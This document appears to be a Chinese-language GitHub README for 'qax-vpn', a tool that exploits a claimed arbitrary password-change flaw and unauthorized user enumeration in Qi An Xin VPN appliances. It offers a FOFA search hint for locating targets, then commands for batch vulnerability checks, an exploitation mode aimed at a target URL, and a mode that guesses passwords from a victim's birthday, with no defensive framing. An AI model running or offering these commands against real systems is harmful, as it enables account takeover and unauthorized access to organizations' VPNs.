# qax-vpn
奇安信VPN存在任意账号密码修改漏洞以及未授权管理用户遍历漏洞

# ikun版
![图片](https://github.com/fork778/qax-vpn/assets/109639355/ce4259ff-91e1-4282-8e2a-129d217a63d0)


## USE
`fofa:app=""`

```bash
pip install -r requirements.txt
```

## 油饼食用方式
```bash
检测漏洞
python3 qax-vpn.py -f file.txt -check

漏洞利用
python3 qax-vpn.py -u https://xxxxx.xxxxx -exp

获取密码
python3 qax-vpn.py -p
输入他的生日,示例: `1992-01-0`
```
### 批量检测
<img width="1336" alt="图片" src="https://github.com/fork778/qax-vpn/assets/109639355/84d2082c-290a-4b6d-9e38-87dfd753b5b5">

### 漏洞利用
<img width="1336" alt="图片" src="https://github.com/fork778/qax-vpn/assets/109639355/cb37724f-39f2-4340-8a47-60c759ff0ff4">

### 获取密码
<img width="1207" alt="图片" src="https://github.com/fork778/qax-vpn/assets/109639355/ddb4033c-abfb-491f-b504-61af9ce7b8a8">
